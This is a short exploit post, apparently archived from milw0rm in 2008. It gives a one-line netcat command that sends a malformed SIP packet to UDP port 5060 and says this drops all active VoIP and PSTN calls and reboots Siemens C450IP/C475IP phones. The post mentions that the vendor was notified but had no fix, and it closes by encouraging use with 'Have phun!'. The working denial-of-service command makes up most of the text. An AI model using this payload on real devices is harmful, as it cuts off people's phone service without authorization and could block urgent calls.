Hi,

echo -e "X sip:s X\nFrom:<sip:@x>\nTo:<sip:@x>\n" | nc -q0 -u <target> 5060

Will disconnect all current VOIP and PSTN calls and reboot
the C450IP/C475IP devices.

Tested with current firmwares.

Vendor (Siemens) was contacted 11/2007, no fix supplied yet.

Have phun!

sky & Any

# milw0rm.com [2008-11-24]